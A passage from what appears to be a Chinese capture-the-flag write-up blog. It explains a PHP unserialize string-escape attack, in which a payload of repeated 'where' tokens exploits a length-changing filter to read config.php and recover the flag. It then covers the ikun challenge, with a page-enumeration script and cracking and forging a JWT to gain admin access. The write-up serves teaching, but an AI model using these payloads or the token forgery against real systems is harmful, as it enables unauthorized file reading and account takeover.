class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __class__;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">            <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        );</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __class__;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure></div></h2><h3 id="最后还有接收的config-php"><a href="#最后还有接收的config-php" class="headerlink" title="最后还有接收的config.php"></a>最后还有接收的config.php</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>在 <code>profile.php</code> 中有个文件读取的地方</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>我们发现还有个反序列化 <code>unserialize</code>，感觉有戏，如果 <code>$profile[&#39;photo&#39;]</code>是 <code>config.php</code> 就可以读取到了，可以对photo进行操作的地方在 <code>update.php</code>，有<code>phone</code>、<code>email</code>、<code>nickname</code> 和 <code>photo</code> 这几个。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span> = a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;phone&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;12345678901&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;123@163.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;photo&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;config.php&quot;</span>;&#125;s:<span class="number">39</span>:<span class="string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [phone] =&gt; <span class="number">12345678901</span></span><br><span class="line">    [email] =&gt; <span class="number">123</span>@<span class="number">163</span>.com</span><br><span class="line">    [nickname] =&gt; <span class="number">123</span></span><br><span class="line">    [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>可以看到反序列化之后，最后面upload这一部分就没了，下面就是想办法把 <code>config.php</code> 塞进去了。<br>从数组顺序上看是和上面数组的顺序一样的，可以抓个包看下post顺序，那么最有可能的就是从nickname下手了。<br>在设置了 <code>$profile</code> 之后，用    <code>update_profile()</code> 函数进行处理：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<p>进行了过滤：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">    <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="laolao-大佬解释为什么要34个where"><a href="#laolao-大佬解释为什么要34个where" class="headerlink" title="laolao 大佬解释为什么要34个where"></a>laolao 大佬解释为什么要34个where</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">        <span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">        <span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">filter</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;**************************************************&#x27;</span>);</span><br><span class="line"><span class="comment">// $profile = &#x27;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="variable">$profile</span> = <span class="string">&#x27;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:170:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$profile</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">where的code长度为170，变成hacker后长度为204，二者刚好差34。直接传一个204的where（此时的序列化语句是不正确的）让filter帮我们替换成hacker构造一个204的（这个序列化语句就是正确的了），然后后面的34的序列化语句，就是我们要传给photo的，把原来的photo序列化语句给挤出去。</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/1697845-20191103011823574-878009239.png" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/1697845-20191103011823574-878009239.png" class="lazyload"></a></p>
<hr>
<p>在where被正则匹配换成hacker之后，正好满足长度<br>然后后面的 <code>&quot;34*where&#125;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> 也就不是 <code>nickname</code> 的一部分了，被反序列化的时候就会被当成photo，就可以读取到config.php的内容了。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxp2h8j315y0gz0xm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9rosxp2h8j315y0gz0xm.jpg" class="lazyload"></a></p>
<p>然后进入到profile中查看图片信息，把base64码解码：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFne2E4NGZlMDNiLTBmOWUtNGIxNy1hNmYyLTM3YjA3MTZjNGMxOX0nOwo/Pgo=</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;qwertyuiop&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;challenges&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;a84fe03b-0f9e-4b17-a6f2-37b0716c4c19&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mh65zj30fm06d74j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mh65zj30fm06d74j.jpg" class="lazyload"></a><br>说要买到Lv6， 先来个脚本跑一下，找到lv6</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://0049754d-13ec-4783-925e-ae2f190c2096.node3.buuoj.cn/shop?page=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line"></span><br><span class="line">    r=requests.get(url+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span> (i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>找到之后发现要一大堆钱才能买</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ml0nyj30dg0eqq38.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ml0nyj30dg0eqq38.jpg" class="lazyload"></a></p>
<p>然后购买的时候看到打折，尝试抓包（<del>薅羊毛</del>）<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mi1z2j30c80d2mxm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mi1z2j30c80d2mxm.jpg" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ms4mkj312u0g2jvu.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0ms4mkj312u0g2jvu.jpg" class="lazyload"></a></p>
<p>回显说要admin用户才能，行吧</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mjcofj30gj07dweh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mjcofj30gj07dweh.jpg" class="lazyload"></a></p>
<hr>
<p>抓包看到<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">JWT</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mtbdpj31010bnjuk.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mtbdpj31010bnjuk.jpg" class="lazyload"></a></p>
<p>Base64解码后得到</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;&#123;&quot;username&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure></div>

<p>看到 <code>username</code> 是我自己的登陆名123，这里需要改为 <code>admin</code></p>
<p>后边解码不出来因为经过了sha256，需要破解key<br>git上找到工具。（<a href="https://github.com/brendan-rius/c-jwt-cracker">工具地址</a>）</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mrmnbj30ol0243yy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mrmnbj30ol0243yy.jpg" class="lazyload"></a></p>
<p>然后伪造我们的jwt （<a href="https://jwt.io/">生成JWT的网站</a>）<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mx5x4j313f0jbwg6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0mx5x4j313f0jbwg6.jpg" class="lazyload"></a></p>
<p>好的 进来了<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0musdlj30ea0d8mxd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9qj0musdlj30ea0d8mxd.jpg" class="lazyload"></a></p>
<hr>
<p>在页面源码里看到了下载 <code>www.zip</code> 的路径</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">html</div></div><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui text container login-wrap-inf&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 潜伏敌后已久,只能帮到这了 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/static/asd1f654e683wq/www.zip&quot;</span> &gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;visibility:hidden&quot;</span>&gt;</span>删库跑路前我留了好东西在这里<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segments center padddd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对抗*站黑科技，目前为测试阶段，只对管理员开放 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ui segment&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/b.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<hr>
<p>下载 <code>www.zip</code> 打开之后找到了一个python反序列化的地方，在 <code>admin.py</code></p>
